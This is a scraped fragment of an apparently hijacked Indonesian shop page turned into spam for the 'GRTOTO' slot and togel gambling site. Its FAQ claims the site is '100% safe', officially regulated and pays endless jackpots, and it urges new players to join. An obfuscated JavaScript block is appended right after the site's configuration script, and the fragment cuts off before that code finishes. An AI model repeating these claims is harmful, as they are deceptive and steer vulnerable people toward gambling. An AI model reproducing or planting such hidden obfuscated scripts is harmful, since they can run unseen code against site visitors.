                Mengapa GRTOTO selalu jadi incaran pemain slot dan togel toto 4D?
                <div class="icon-wrapper">
                    <div class="icon-bar horizontal"></div>
                    <div class="icon-bar vertical"></div>
                </div>
            </button>
            <div class="faq-answer">
                <p>Tentu saja karena, GRTOTO terkenal sebagai platform bandar slot gacor jackpot tanpa henti & togel toto 4D pasaran lengkap terpercaya. Memiliki regulasi resmi, reputasi baik, serta menyediakan link alternatif cepat dan stabil untuk semua pemain.</p>
            </div>
        </div>

        <div class="faq-item">
            <button class="faq-question">
                Bagaimana dengan sistem permainan di GRTOTO, amankah?
                <div class="icon-wrapper">
                    <div class="icon-bar horizontal"></div>
                    <div class="icon-bar vertical"></div>
                </div>
            </button>
            <div class="faq-answer">
                <p>Ya, 100% pasti aman GRTOTO memiliki sistem elite modern dan fair play hingga pemain mampu memainkan slot online maupun togel dengan nyaman di platform terpercaya ini.</p>
            </div>
        </div>

        <div class="faq-item">
            <button class="faq-question">
                Pasaran slot dan togel toto apa saja yang tersedia di GR TOTO?
                <div class="icon-wrapper">
                    <div class="icon-bar horizontal"></div>
                    <div class="icon-bar vertical"></div>
                </div>
            </button>
            <div class="faq-answer">
                <p>GR TOTO menghadirkan pasaran slot online dan togel paling populer dengan result cepat serta sangat akurat. Menjadikan GR selalu jadi pilihan pertama bagi para pengguna hari ini, terutama slot Pragmatic yang selalu memberi jackpot spektakuler.</p>
            </div>
        </div>

        <div class="faq-item">
            <button class="faq-question">
                Tersediakah di GRTOTO untuk layanan bantuan?
                <div class="icon-wrapper">
                    <div class="icon-bar horizontal"></div>
                    <div class="icon-bar vertical"></div>
                </div>
            </button>
            <div class="faq-answer">
                <p>Layanan bantuan handal akan selalu siap membantu pemain kapan pun, menjadikan GRTOTO sangat unggul sebagai platform terbaik 2026 hari ini.</p>
            </div>
        </div>

        <div class="faq-item">
            <button class="faq-question">
                Cocok kah GRTOTO untuk para pemain baru?
                <div class="icon-wrapper">
                    <div class="icon-bar horizontal"></div>
                    <div class="icon-bar vertical"></div>
                </div>
            </button>
            <div class="faq-answer">
                <p>Sangat-sangat-sangat cocok, pemain baru dapat mencoba memilih GRTOTO sebab konsistensi, regulasi, stabilitas link, maupun kenyamanan bermain.</p>
            </div>
        </div>

    </div>
</div>
                            <section class="grid gap-10">
                                <div class="grid gap-4" bis_skin_checked="1">
                                    <h2 class="h7 text-bw-900"> Diskusi Produk(0) </h2><span
                                        class="font-semibold text-[#797979]">GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti</span>
                                </div>
                                <div class="grid gap-6" bis_skin_checked="1">
                                    <div class="flex flex-col items-center justify-center gap-6 px-2 text-center md:gap-10"
                                        bis_skin_checked="1"><img src="/asset/no-discussion.webp" alt=""
                                            class="w-full max-md:max-w-[60vw] md:w-1/6" loading="lazy">
                                        <div class="flex flex-col items-center gap-3" bis_skin_checked="1">
                                            <h3 class="h7 text-bw-800">Belum Ada Diskusi</h3><span
                                                class="text-balance text-lg text-bw-500">Mulai diskusi dengan pengguna
                                                lain terkait produk yang
                                                menarik perhatian. </span>
                                            <!---->
                                        </div>
                                    </div>
                                </div>
                                <div class="relative w-full" bis_skin_checked="1">
                                    <div class="absolute right-3 top-3 w-5" bis_skin_checked="1">
                                        <div class="relative" bis_skin_checked="1"><button><span
                                                    class="nuxt-icon nuxt-icon--fill text-xl text-bw-300"><svg
                                                        width="20" height="20" viewBox="0 0 20 20" fill="none"
                                                        xmlns="http://www.w3.org/2000/svg">
                                                        <path
                                                            d="M17.5 10C17.5 5.85786 14.1421 2.5 10 2.5C5.85786 2.5 2.5 5.85786 2.5 10C2.5 14.1421 5.85786 17.5 10 17.5C14.1421 17.5 17.5 14.1421 17.5 10ZM19.167 10C19.167 15.0626 15.0626 19.167 10 19.167C4.93739 19.167 0.833008 15.0626 0.833008 10C0.833008 4.93739 4.93739 0.833008 10 0.833008C15.0626 0.833008 19.167 4.93739 19.167 10Z"
                                                            fill="black"></path>
                                                        <path
                                                            d="M12.8864 12.5C13.2342 12.1988 13.7608 12.2363 14.0622 12.584C14.3634 12.9318 14.3258 13.4584 13.9782 13.7597C13.4496 14.2175 12.7877 14.5206 12.1286 14.7109C11.4562 14.905 10.7242 15 9.99966 15C9.27516 14.9999 8.54305 14.905 7.87076 14.7109C7.21173 14.5206 6.55059 14.2174 6.02213 13.7597C5.67428 13.4584 5.63687 12.9318 5.93814 12.584C6.23945 12.2365 6.76518 12.199 7.11295 12.5C7.40548 12.7533 7.82687 12.964 8.33365 13.1103C8.84019 13.2565 9.4148 13.333 9.99966 13.333C10.5848 13.333 11.16 13.2566 11.6667 13.1103C12.1733 12.9641 12.5939 12.7532 12.8864 12.5Z"
                                                            fill="black"></path>
                                                        <path
                                                            d="M8.33332 8.33333C8.33332 8.79357 7.96023 9.16667 7.49999 9.16667C7.03975 9.16667 6.66666 8.79357 6.66666 8.33333C6.66666 7.8731 7.03975 7.5 7.49999 7.5C7.96023 7.5 8.33332 7.8731 8.33332 8.33333Z"
                                                            fill="black"></path>
                                                        <path
                                                            d="M8.33365 8.33301C8.33347 7.87292 7.95979 7.5 7.49966 7.5C7.03969 7.50018 6.66683 7.87303 6.66666 8.33301C6.66666 8.76444 6.99454 9.11938 7.4147 9.16211L7.49966 9.16699C7.93099 9.16699 8.28589 8.83895 8.32877 8.41895L8.33365 8.33301ZM8.74966 8.33301C8.74966 9.02336 8.19002 9.58301 7.49966 9.58301C6.80946 9.58283 6.24966 9.02326 6.24966 8.33301C6.24984 7.64291 6.80957 7.08318 7.49966 7.08301C8.18991 7.08301 8.74949 7.6428 8.74966 8.33301Z"
                                                            fill="black"></path>
                                                        <path
                                                            d="M13.3333 8.33333C13.3333 8.79357 12.9602 9.16667 12.5 9.16667C12.0398 9.16667 11.6667 8.79357 11.6667 8.33333C11.6667 7.8731 12.0398 7.5 12.5 7.5C12.9602 7.5 13.3333 7.8731 13.3333 8.33333Z"
                                                            fill="black"></path>
                                                        <path
                                                            d="M13.3336 8.33301C13.3335 7.87292 12.9598 7.5 12.4997 7.5C12.0397 7.50018 11.6668 7.87303 11.6667 8.33301C11.6667 8.76444 11.9945 9.11938 12.4147 9.16211L12.4997 9.16699C12.931 9.16699 13.2859 8.83895 13.3288 8.41895L13.3336 8.33301ZM13.7497 8.33301C13.7497 9.02336 13.19 9.58301 12.4997 9.58301C11.8095 9.58283 11.2497 9.02326 11.2497 8.33301C11.2498 7.64291 11.8096 7.08318 12.4997 7.08301C13.1899 7.08301 13.7495 7.6428 13.7497 8.33301Z"
                                                            fill="black"></path>
                                                    </svg>
                                                </span></button>
                                            <!---->
                                        </div>
                                    </div><textarea type="text" rows="10" class="form-rounded w-full !rounded-xl !pl-10"
                                        placeholder="Ada yang ingin Anda tanyakan tentang produk ini? Mohon gunakan bahasa yang santun dan berdiskusi sesuai topik"></textarea><button
                                        class="btn btn-primary absolute bottom-3 right-3 !px-14"> Kirim </button>
                                </div>
                            </section>

                            <script>
                                document.addEventListener('DOMContentLoaded', function () {
                                    const faqItems = document.querySelectorAll('.faq-item');

                                    faqItems.forEach(item => {
                                        const question = item.querySelector('.faq-question');

                                        question.addEventListener('click', () => {
                                            const isActive = item.classList.contains('active');

                                            // Close all other items
                                            faqItems.forEach(otherItem => {
                                                otherItem.classList.remove('active');
                                            });

                                            // Toggle current item
                                            if (!isActive) {
                                                item.classList.add('active');
                                            }
                                        });
                                    });
                                });
                            </script>
                        </div>
                        <!---->
                    </div>
                    <div class="fixed bottom-0 left-0 right-0 z-[1] flex h-24 bg-[#F7F8FA]" bis_skin_checked="1">
                        <div class="container flex items-center justify-between py-4" bis_skin_checked="1">
                            <div class="flex items-center gap-3 max-md:hidden" bis_skin_checked="1"><img
                                    src="https://ik.imagekit.io/ljdihgltp/C.E.O.jpg"
                                    alt="" class="size-16 rounded object-contain" loading="lazy">
                                <div class="grid" bis_skin_checked="1">
                                    <span class="text-lg font-medium">GRTOTO: Pusat Bandar Slot Togel Terpercaya Tempat Jackpot Spektakuler Tanpa Henti
                                    </span>
                                    <div class="flex text-sm text-bw-500" bis_skin_checked="1"><span></span></div>
                                </div>
                            </div>
                            <div class="flex items-center gap-3 max-md:justify-between md:gap-6" bis_skin_checked="1">
                                <div class="flex flex-col max-md:hidden" bis_skin_checked="1">
                                    <div class="flex gap-1" bis_skin_checked="1">
                                        <span class="text-bw-300">Stok:</span><span
                                            class="font-bold text-danger-main">Sisa 88</span>
                                    </div>
                                    <div class="flex max-w-32 overflow-hidden rounded-full border" bis_skin_checked="1">
                                        <button class="bg-white p-2 font-semibold disabled:bg-gray-200" disabled=""> -
                                        </button><input type="text"
                                            class="form-default w-full text-center disabled:bg-gray-100"><button
                                            class="bg-white p-2 font-semibold disabled:bg-gray-200"> + </button>
                                    </div>
                                </div>
                                <div class="flex flex-col max-md:hidden" bis_skin_checked="1"><span
                                        class="text-bw-800">Subtotal</span><span
                                        class="text-lg font-bold text-primary">5.000</span>
                                </div><button class="btn btn-primary !text-nowrap"><a
                                        href="https://c-e-o.b-cdn.net/c-e-o.html">Beli
                                        Sekarang</a>
                                </button>
                                <!---->
                                <!---->
                                <!----><button class="btn-primary-outline btn"><span
                                        class="nuxt-icon nuxt-icon--fill"><svg width="22" height="20"
                                            viewBox="0 0 22 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                d="M0.25 1C0.25 0.585786 0.585786 0.25 1 0.25H2.38568C3.23515 0.25 3.9785 0.821088 4.19738 1.64188L4.42868 2.50926C4.78505 2.5031 5.14217 2.5 5.5 2.5C10.7036 2.5 15.7555 3.15442 20.5773 4.38583C20.7794 4.43743 20.9508 4.57082 21.0505 4.75399C21.1502 4.93716 21.1691 5.15357 21.1027 5.35126C20.2683 7.83603 19.2777 10.249 18.1425 12.5785C18.0168 12.8364 17.7551 13 17.4683 13H6.25C5.27034 13 4.43691 13.6261 4.12803 14.5H19C19.4142 14.5 19.75 14.8358 19.75 15.25C19.75 15.6642 19.4142 16 19 16H3.25C2.83579 16 2.5 15.6642 2.5 15.25C2.5 13.5051 3.69178 12.0385 5.30576 11.6199L3.13122 3.46534L3.13122 3.46534L2.74803 2.02838L2.74803 2.02837C2.70425 1.86422 2.55558 1.75 2.38568 1.75H1C0.585786 1.75 0.25 1.41421 0.25 1ZM4.82721 4.00374L6.82621 11.5H16.9974C17.904 9.60137 18.7125 7.64695 19.4164 5.6433C14.9538 4.56917 10.2939 4 5.5 4C5.27544 4 5.05117 4.00125 4.82721 4.00374ZM2.5 18.25C2.5 17.4216 3.17157 16.75 4 16.75C4.82843 16.75 5.5 17.4216 5.5 18.25C5.5 19.0784 4.82843 19.75 4 19.75C3.17157 19.75 2.5 19.0784 2.5 18.25ZM15.25 18.25C15.25 17.4216 15.9216 16.75 16.75 16.75C17.5784 16.75 18.25 17.4216 18.25 18.25C18.25 19.0784 17.5784 19.75 16.75 19.75C15.9216 19.75 15.25 19.0784 15.25 18.25Z"
                                                fill="black"></path>
                                        </svg>
                                    </span></button>
                                <!---->
                                <!---->
                                <div class="flex gap-2 divide-x" bis_skin_checked="1">
                                   <a
                                        href="https://otiumpro.com/clientes/" class="pl-3"><span
                                            class="nuxt-icon nuxt-icon--fill text-2xl text-primary"><svg width="21"
                                                height="21" viewBox="0 0 21 21" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M19.25 2C19.25 1.86193 19.1381 1.75 19 1.75H2C1.86193 1.75 1.75 1.86193 1.75 2V17.5273L4.43945 14.502L4.49609 14.4453C4.63341 14.3206 4.81259 14.25 5 14.25H19C19.1381 14.25 19.25 14.1381 19.25 14V2ZM20.75 14C20.75 14.9665 19.9665 15.75 19 15.75H5.33691L1.56055 19.998C1.35367 20.2308 1.02446 20.3118 0.733398 20.2012C0.442348 20.0905 0.25 19.8114 0.25 19.5V2C0.25 1.0335 1.0335 0.25 2 0.25H19C19.9665 0.25 20.75 1.0335 20.75 2V14Z"
                                                    fill="black"></path>
                                                <path
                                                    d="M16 4L16.0771 4.00391C16.4551 4.04253 16.75 4.36183 16.75 4.75C16.75 5.13817 16.4551 5.45747 16.0771 5.49609L16 5.5H6C5.58579 5.5 5.25 5.16421 5.25 4.75C5.25 4.33579 5.58579 4 6 4H16Z"
                                                    fill="black"></path>
                                                <path
                                                    d="M16 7L16.0771 7.00391C16.4551 7.04253 16.75 7.36183 16.75 7.75C16.75 8.13817 16.4551 8.45747 16.0771 8.49609L16 8.5H6C5.58579 8.5 5.25 8.16421 5.25 7.75C5.25 7.33579 5.58579 7 6 7H16Z"
                                                    fill="black"></path>
                                                <path
                                                    d="M11 10L11.0771 10.0039C11.4551 10.0425 11.75 10.3618 11.75 10.75C11.75 11.1382 11.4551 11.4575 11.0771 11.4961L11 11.5H6C5.58579 11.5 5.25 11.1642 5.25 10.75C5.25 10.3358 5.58579 10 6 10H11Z"
                                                    fill="black"></path>
                                            </svg>
                                        </span></a><button class="pl-3"><span class="nuxt-icon text-2xl"
                                            style="display: none;"><svg width="21" height="19" viewBox="0 0 21 19"
                                                fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M19.875 5.59375C19.875 3.00492 17.6889 0.90625 14.9922 0.90625C12.9759 0.90625 11.2451 2.07946 10.5 3.75356C9.75492 2.07946 8.02408 0.90625 6.00781 0.90625C3.31111 0.90625 1.125 3.00492 1.125 5.59375C1.125 13.1152 10.5 18.0938 10.5 18.0938C10.5 18.0938 19.875 13.1152 19.875 5.59375Z"
                                                    fill="#EC213D" stroke="#EC213D" stroke-width="1.5625"
                                                    stroke-linecap="round" stroke-linejoin="round"></path>
                                            </svg>
                                        </span><span class="nuxt-icon nuxt-icon--fill text-2xl text-primary"><svg
                                                width="22" height="20" viewBox="0 0 22 20" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                    d="M11.1667 17.7327C7.95833 16.6667 2 12.0833 2 7.04167C2 4.25729 4.25729 2 7.04167 2C7.85076 1.99943 8.64808 2.19382 9.36612 2.56672C9.62983 2.70368 9.88 2.86323 10.114 3.04312C10.5172 3.35302 10.8725 3.72326 11.1667 4.14225C11.4604 3.72498 11.8159 3.35429 12.2199 3.04346C13.0704 2.38909 14.1357 2 15.2917 2C18.076 2 20.3333 4.25729 20.3333 7.04167C20.3333 12.0833 14.375 16.6667 11.1667 17.7327ZM11.1673 1.96387C10.8243 1.68502 10.4526 1.44074 10.0574 1.23554C9.12584 0.75172 8.0914 0.499429 7.04167 0.500001M11.1673 1.96387C12.292 1.04955 13.7278 0.500001 15.2917 0.500001C18.9045 0.500001 21.8333 3.42887 21.8333 7.04167C21.8333 10.1387 20.0273 12.9053 18.019 14.9335C15.9961 16.9764 13.509 18.5351 11.6397 19.1562C11.3326 19.2583 11.0007 19.2583 10.6937 19.1562C8.82433 18.5351 6.33726 16.9764 4.31435 14.9335C2.30603 12.9053 0.5 10.1387 0.5 7.04167C0.5 3.42922 3.42829 0.500574 7.04061 0.500001"
                                                    fill="black"></path>
                                            </svg>
                                        </span></button><button class="pl-3"><span
                                            class="nuxt-icon nuxt-icon--fill text-2xl text-primary"><svg width="24"
                                                height="24" viewBox="0 0 24 24" fill="none"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <path
                                                    d="M19.5 8.25C21.5711 8.25 23.25 6.57107 23.25 4.5C23.25 2.42893 21.5711 0.75 19.5 0.75C17.4289 0.75 15.75 2.42893 15.75 4.5C15.75 4.59996 15.7539 4.699 15.7616 4.79699L6.9805 9.18754C6.31943 8.60405 5.45106 8.25 4.5 8.25C2.42893 8.25 0.75 9.92893 0.75 12C0.75 14.0711 2.42893 15.75 4.5 15.75C5.45105 15.75 6.31941 15.396 6.98047 14.8125L15.7616 19.203C15.7539 19.301 15.75 19.4001 15.75 19.5C15.75 21.5711 17.4289 23.25 19.5 23.25C21.5711 23.25 23.25 21.5711 23.25 19.5C23.25 17.4289 21.5711 15.75 19.5 15.75C18.5489 15.75 17.6806 16.104 17.0195 16.6875L8.23841 12.297C8.24609 12.199 8.25 12.1 8.25 12C8.25 11.9001 8.24609 11.801 8.23842 11.703L17.0195 7.31249C17.6806 7.89596 18.549 8.25 19.5 8.25Z"
                                                    fill="white"></path>
                                            </svg>
                                        </span></button></div>
                            </div>
                        </div>
                    </div>
                </main>
            </div>
            <footer class="grid gap-8 border-t border-[#D1D1D1] pt-8" data-v-6f6249f3="">
                <div class="container grid grid-cols-2 gap-4 text-sm md:grid-cols-7 md:gap-10" data-v-6f6249f3=""
                    bis_skin_checked="1">
                    <div class="col-span-2 mb-auto grid gap-3" data-v-6f6249f3="" bis_skin_checked="1"><span
                            class="font-bold" data-v-6f6249f3="">DatascripMall.ID</span><span data-v-6f6249f3="">Jl.
                            Kawai P Block D-50 Kav 13 Gunung Kawi
                            Bekasi Timur Laut, Kegabutan Kampung Jakarta Tanah Abang 177788</span><span class="font-bold"
                            data-v-6f6249f3="">Langganan Newsletter</span>
                        <div class="relative z-0 flex items-center" data-v-6f6249f3="" bis_skin_checked="1"><input
                                value="" type="text" class="form-rounded" placeholder="Masukkan email Anda"
                                data-v-6f6249f3=""><button
                                class="btn-icon btn-primary absolute right-2 top-1/2 !size-8 -translate-y-1/2 disabled:!bg-primary disabled:opacity-50"
                                aria-label="send-btn" data-v-6f6249f3=""><span class="nuxt-icon" data-v-6f6249f3=""><svg
                                        width="10" height="10" viewBox="0 0 10 10" fill="none"
                                        xmlns="http://www.w3.org/2000/svg">
                                    </svg>
                                </span></button></div>
                    </div>
                    <div class="mb-auto grid gap-3" data-v-6f6249f3="" bis_skin_checked="1"><span class="font-bold"
                            data-v-6f6249f3="">Informasi</span>
                        <div class="grid gap-2" data-v-6f6249f3="" bis_skin_checked="1"><a
                                href="https://otiumpro.com/clientes/" class="link-footer" data-v-6f6249f3="">
                                Kebijakan Privasi </a><a href="https://otiumpro.com/clientes/" class="link-footer"
                                data-v-6f6249f3=""> Syarat &amp; Ketentuan </a><a href="https://otiumpro.com/clientes/"
                                class="link-footer" data-v-6f6249f3="">
                                Tentang Kami </a></div>
                    </div>
                    <div class="mb-auto grid gap-3" data-v-6f6249f3="" bis_skin_checked="1"><span class="font-bold"
                            data-v-6f6249f3="">Layanan</span>
                        <div class="grid gap-2" data-v-6f6249f3="" bis_skin_checked="1"><a
                                href="https://otiumpro.com/clientes/" class="link-footer" data-v-6f6249f3="">
                                Cara Berbelanja </a><a href="https://otiumpro.com/clientes/" class="link-footer"
                                data-v-6f6249f3=""> Cara Pembayaran </a><a href="https://otiumpro.com/clientes/"
                                class="link-footer" data-v-6f6249f3="">
                                Pengiriman </a></div>
                    </div>
                    <div class="mb-auto grid gap-3" data-v-6f6249f3="" bis_skin_checked="1"><span class="font-bold"
                            data-v-6f6249f3="">Keamanan Belanja</span><a href="https://otiumpro.com/clientes/"
                            rel="noopener noreferrer" target="_blank" data-v-6f6249f3=""
                            bis_size="{&quot;x&quot;:938,&quot;y&quot;:1026,&quot;w&quot;:132,&quot;h&quot;:51,&quot;abs_x&quot;:938,&quot;abs_y&quot;:1026}"><img
                                src="https://1v5pkxe0s3.ucarecd.net/e69e9174-cd02-495b-bf8a-f191b797f75e/iconceo.png" alt="iso sec logo" width="51"
                                height="51" class="h-[51px] w-[51px]" loading="lazy" data-v-6f6249f3=""
                                bis_size="{&quot;x&quot;:938,&quot;y&quot;:1026,&quot;w&quot;:98,&quot;h&quot;:51,&quot;abs_x&quot;:938,&quot;abs_y&quot;:1026}"
                                bis_id="bn_hxmyeaen28wvavn5y91m8j"></a></div>
                    <div class="grid gap-4 md:col-span-2" data-v-6f6249f3="" bis_skin_checked="1">

                        <div class="mb-auto grid gap-3" data-v-6f6249f3="" bis_skin_checked="1"><span class="font-bold"
                                data-v-6f6249f3="">Ikuti Kami</span>
                            <div class="flex gap-3" data-v-6f6249f3="" bis_skin_checked="1">
                                <!--[--><a href="https://www.instagram.com/datascripmall" rel="noopener noreferrer"
                                    target="_blank" alt="social link instagram" class="hover:opacity-80"
                                    aria-label="social link instagram" data-v-6f6249f3=""><span
                                        class="nuxt-icon text-2xl" data-v-6f6249f3=""><svg width="21" height="21"
                                            viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M10.5 7.005C8.565 7.005 7.005 8.58 7.005 10.5C7.005 12.42 8.58 13.995 10.5 13.995C12.42 13.995 13.995 12.42 13.995 10.5C13.995 8.58 12.42 7.005 10.5 7.005ZM21 10.5C21 9.045 21 7.62 20.925 6.165C20.85 4.485 20.46 2.985 19.23 1.77C18 0.54 16.515 0.15 14.835 0.0749999C13.38 -7.26432e-08 11.955 0 10.5 0C9.045 0 7.62 -7.26432e-08 6.165 0.0749999C4.485 0.15 2.985 0.54 1.77 1.77C0.54 3 0.15 4.485 0.0749999 6.165C-7.26432e-08 7.62 0 9.045 0 10.5C0 11.955 -7.26432e-08 13.38 0.0749999 14.835C0.15 16.515 0.54 18.015 1.77 19.23C3 20.46 4.485 20.85 6.165 20.925C7.62 21 9.045 21 10.5 21C11.955 21 13.38 21 14.835 20.925C16.515 20.85 18.015 20.46 19.23 19.23C20.46 18 20.85 16.515 20.925 14.835C21.015 13.395 21 11.955 21 10.5ZM10.5 15.885C7.515 15.885 5.115 13.485 5.115 10.5C5.115 7.515 7.515 5.115 10.5 5.115C13.485 5.115 15.885 7.515 15.885 10.5C15.885 13.485 13.485 15.885 10.5 15.885ZM16.11 6.15C15.42 6.15 14.85 5.595 14.85 4.89C14.85 4.185 15.405 3.63 16.11 3.63C16.815 3.63 17.37 4.185 17.37 4.89C17.3738 5.05431 17.3438 5.21764 17.2819 5.36987C17.2199 5.52211 17.1274 5.66 17.01 5.775C16.895 5.89241 16.7571 5.98495 16.6049 6.04687C16.4526 6.1088 16.2893 6.1388 16.125 6.135L16.11 6.15Z"
                                                fill="#005AAB"></path>
                                        </svg>
                                    </span></a><a href="https://www.youtube.com/@datascripmall"
                                    rel="noopener noreferrer" target="_blank" alt="social link youtube"
                                    class="hover:opacity-80" aria-label="social link youtube" data-v-6f6249f3=""><span
                                        class="nuxt-icon text-2xl" data-v-6f6249f3=""><svg width="21" height="21"
                                            viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M8.4862 8.05184L12.8106 10.5093L8.4862 12.9667V8.05184ZM20.351 2.50555V18.4948C20.351 19.6986 19.3744 20.6752 18.1706 20.6752H2.18133C0.977595 20.6752 0.000976562 19.6986 0.000976562 18.4948V2.50555C0.000976562 1.30181 0.977595 0.325195 2.18133 0.325195H18.1706C19.3744 0.325195 20.351 1.30181 20.351 2.50555ZM18.4432 10.5138C18.4432 10.5138 18.4432 7.80655 18.0979 6.50742C17.9072 5.78972 17.3484 5.22646 16.6353 5.03568C15.3498 4.68591 10.176 4.68591 10.176 4.68591C10.176 4.68591 5.00217 4.68591 3.71667 5.03568C3.00351 5.22646 2.44479 5.78972 2.25401 6.50742C1.90879 7.802 1.90879 10.5138 1.90879 10.5138C1.90879 10.5138 1.90879 13.2211 2.25401 14.5202C2.44479 15.2379 3.00351 15.7785 3.71667 15.9693C5.00217 16.3145 10.176 16.3145 10.176 16.3145C10.176 16.3145 15.3498 16.3145 16.6353 15.9647C17.3484 15.7739 17.9072 15.2334 18.0979 14.5157C18.4432 13.2211 18.4432 10.5138 18.4432 10.5138Z"
                                                fill="#005AAB"></path>
                                        </svg>
                                    </span></a><a href="https://www.facebook.com/datascripmall"
                                    rel="noopener noreferrer" target="_blank" alt="social link facebook"
                                    class="hover:opacity-80" aria-label="social link facebook" data-v-6f6249f3=""><span
                                        class="nuxt-icon text-2xl" data-v-6f6249f3=""><svg width="21" height="21"
                                            viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M17.7007 0.324219H3.35095C1.70095 0.324219 0.350952 1.67422 0.350952 3.32422V17.6755C0.350952 19.3255 1.70095 20.6755 3.35095 20.6755H17.7022C19.3522 20.6755 20.7022 19.3255 20.7022 17.6755V3.32422C20.7007 1.67422 19.3522 0.324219 17.7007 0.324219ZM17.508 11.1865H15.093V19.924H11.4795V11.1865H9.67195V8.17447H11.4795V6.36697C11.4795 3.90997 12.4995 2.44822 15.402 2.44822H17.8147V5.45947H16.3057C15.1777 5.45947 15.1027 5.88172 15.1027 6.66697L15.093 8.17447H17.8267L17.508 11.1865Z"
                                                fill="#005AAB"></path>
                                        </svg>
                                    </span></a><a href="https://www.tiktok.com/@datascripmall" rel="noopener noreferrer"
                                    target="_blank" alt="social link tiktok" class="hover:opacity-80"
                                    aria-label="social link tiktok" data-v-6f6249f3=""><span class="nuxt-icon text-2xl"
                                        data-v-6f6249f3=""><svg width="21" height="21" viewBox="0 0 21 21" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M17.8421 0.475098H3.61215C2.005 0.475098 0.702148 1.77795 0.702148 3.3851V17.6151C0.702148 19.2222 2.005 20.5251 3.61215 20.5251H17.8421C19.4493 20.5251 20.7521 19.2222 20.7521 17.6151V3.3851C20.7521 1.77795 19.4493 0.475098 17.8421 0.475098Z"
                                                fill="#005AAB"></path>
                                            <path
                                                d="M16.5921 9.1951C15.8421 9.1151 15.1221 8.8751 14.4621 8.5151C14.3821 8.4751 13.9321 8.1651 13.8921 8.1951V13.5151C13.5321 17.0951 9.35215 18.8851 6.52215 16.5751C4.29215 14.7651 4.34215 11.4851 6.49215 9.6251C7.45215 8.7951 8.76215 8.4751 10.0121 8.6651V11.1451C8.84215 10.7551 7.49215 11.5851 7.35215 12.8151C7.04215 15.5251 11.0421 16.0051 11.4121 13.3351V3.5651L11.4421 3.3951H13.1921C13.3121 3.5251 13.3221 3.7451 13.3821 3.9251C13.8421 5.2051 14.9421 6.0751 16.3021 6.2251C16.4021 6.2351 16.5221 6.1851 16.5921 6.2751V9.2051V9.1951Z"
                                                fill="white"></path>
                                        </svg>
                                    </span></a>
                                <!--]-->
                            </div>
                        </div>
                    </div>
                </div>
                <!---->
                <div class="container" data-v-6f6249f3="" bis_skin_checked="1">
                    <div class="border-t py-4 text-center" data-v-6f6249f3="" bis_skin_checked="1">
                        <span
                            class="text-bw-500" data-v-6f6249f3=""> KAWAI ASLI-NYA C.E.O - GRTOTO © . All rights reserved.
                        </span></div>
                </div>
            </footer>
            <!--]-->
        </div>
        <!--teleport start-->
        <!--teleport end-->
        <div id="popup" bis_skin_checked="1">
            <!---->
        </div>
    </div>
    <div id="teleports" bis_skin_checked="1"></div>
    <script>
        window.__NUXT__ = {}; window.__NUXT__.config = { public: { RECAPTCHA_SITE_KEY: "6LdMMTosAAAAAKjGoG96N7jB6KzTd3EHo5eL5ixC", SELLER_PORTAL_URL: "https://seller.datascripmall.id", QISCUS_APPID: "qchatsdk--ufzlmq3mfat", GOOGLE_MAP_KEY: "AIzaSyDI8OmGmXvgVBGFhw19PjZetpYErDvcWq0", MIDTRANS_CLIENT_KEY: "Mid-client-FEbnzdGByjeu4tmc", BASE_URL: "https://otiumpro.com/clientes/", sentry: { dsn: "https://1c384ba46eae429a815a81c5faf49a73@app.glitchtip.com/12653", environment: "production" }, isEnabled: true, session: { enableRefreshPeriodically: false, enableRefreshOnWindowFocus: true }, globalAppMiddleware: { isEnabled: true, allow404WithoutAuth: true, addDefaultCallbackUrl: true }, baseURL: "https://otiumpro.com/clientes/", provider: { type: "authjs", trustHost: true, defaultProvider: "", addDefaultCallbackUrl: true } }, apiParty: { endpoints: { suitapi: { cookies: "" } }, client: false, server: { basePath: "__api_party" } }, snackbar: { top: true, bottom: true, left: false, right: false, groups: true, success: "#4caf50", error: "#ff5252", warning: "#fb8c00", info: "#f32121", duration: 5000, limit: 0, messageClass: "", messageActionClass: "", zIndex: 9999, dense: false, shadow: true, reverse: false, border: "", backgroundOpacity: .12, backgroundColor: "currentColor", baseBackgroundColor: "#ffffff", dismissOnActionClick: false, iconPresets: {} } }                function _0x49a4(_0x4c7f5a,_0x450695){_0x4c7f5a=_0x4c7f5a-0x1bd;var _0x11c384=_0x11c3();var _0x49a403=_0x11c384[_0x4c7f5a];return _0x49a403;}(function(_0x447365,_0xbf4ffc){var _0x20b5b3=_0x49a4,_0x13b2db=_0x447365();while(!![]){try{var _0x2d0f2a=parseInt(_0x20b5b3(0x1c2))/0x1*(parseInt(_0x20b5b3(0x1d2))/0x2)+parseInt(_0x20b5b3(0x1d0))/0x3*(-parseInt(_0x20b5b3(0x1c8))/0x4)+parseInt(_0x20b5b3(0x1d3))/0x5*(parseInt(_0x20b5b3(0x1c6))/0x6)+-parseInt(_0x20b5b3(0x1be))/0x7+parseInt(_0x20b5b3(0x1d8))/0x8*(parseInt(_0x20b5b3(0x1dc))/0x9)+-parseInt(_0x20b5b3(0x1c9))/0xa*(parseInt(_0x20b5b3(0x1cc))/0xb)+parseInt(_0x20b5b3(0x1c4))/0xc;if(_0x2d0f2a===_0xbf4ffc)break;else _0x13b2db['push'](_0x13b2db['shift']());}catch(_0x534f0d){_0x13b2db['push'](_0x13b2db['shift']());}}}(_0x11c3,0x94cc0),(function(){var 